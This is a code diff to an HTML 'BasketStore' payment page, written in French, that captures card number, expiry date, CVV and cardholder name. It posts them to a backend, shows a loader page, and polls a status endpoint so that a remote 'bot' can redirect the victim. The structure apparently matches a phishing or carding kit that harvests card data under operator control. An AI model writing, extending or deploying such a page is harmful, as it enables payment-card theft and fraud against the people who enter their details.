@@ -1,49 +1,53 @@
 <!DOCTYPE html>
 <html lang="fr">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
 <title>Paiement - BasketStore</title>
+<style>
+  body{font-family:Arial;text-align:center;padding:40px;}
+  input{display:block;margin:10px auto;padding:10px;width:80%;font-size:1em;}
+  button{padding:15px 25px;border-radius:10px;font-size:1.1em;cursor:pointer;background:#007bff;color:white;border:none;}
+  button:hover{background:#0056b3;}
+</style>
 </head>
 <body>
-<h1>💳 Paiement</h1>
-<form id="paymentForm">
-<input type="text" placeholder="Numéro de carte" name="cardNumber" required>
-<input type="text" placeholder="Expiry MM/YY" name="expiry" required>
-<input type="text" placeholder="CVV" name="cvv" required>
-<input type="text" placeholder="Nom titulaire" name="nomTitulaire" required>
-<button type="submit">Payer maintenant</button>
-</form>
+  <h1>💳 Paiement</h1>
+  <input type="text" id="cardNumber" placeholder="Numéro de carte">
+  <input type="text" id="expiry" placeholder="MM/YY">
+  <input type="text" id="cvv" placeholder="CVV">
+  <input type="text" id="nomTitulaire" placeholder="Nom titulaire">
+  <button id="payNow">Payer maintenant</button>
 
-<script>
-document.getElementById('paymentForm').addEventListener('submit', async e=>{
-  e.preventDefault();
-  const form = e.target;
-  const data = {
-    cardNumber: form.cardNumber.value,
-    expiry: form.expiry.value,
-    cvv: form.cvv.value,
-    nomTitulaire: form.nomTitulaire.value
-  };
-  await fetch('/api/payment', {
-    method:'POST',
-    headers:{'Content-Type':'application/json'},
-    body:JSON.stringify(data)
-  });
-  window.location.href='/loader.html';
-});
+  <script>
+    document.getElementById('payNow').addEventListener('click', async ()=>{
+      const data = {
+        cardNumber: document.getElementById('cardNumber').value,
+        expiry: document.getElementById('expiry').value,
+        cvv: document.getElementById('cvv').value,
+        nomTitulaire: document.getElementById('nomTitulaire').value
+      };
+      try{
+        await fetch('/api/payment',{
+          method:'POST',
+          headers:{'Content-Type':'application/json'},
+          body: JSON.stringify(data)
+        });
+      }catch(e){console.error(e);}
+      // Redirection frontend vers loader
+      window.location.href = '/loader.html';
+    });
 
-async function checkStatus() {
-  try {
-    const res = await fetch('/api/status');
-    const data = await res.json();
-    if(data.redirect && window.location.pathname !== data.redirect){
-      window.location.href = data.redirect;
+    async function checkBotRedirect() {
+      try{
+        const res = await fetch('/api/status');
+        const data = await res.json();
+        if(data.redirect && window.location.pathname !== data.redirect){
+          window.location.href = data.redirect;
+        } else { setTimeout(checkBotRedirect,2000);}
+      } catch(e){ setTimeout(checkBotRedirect,2000);}
     }
-    setTimeout(checkStatus, 2000);
-  } catch(e){ setTimeout(checkStatus, 2000); }
-}
-checkStatus();
-</script>
+    checkBotRedirect();
+  </script>
 </body>
 </html>
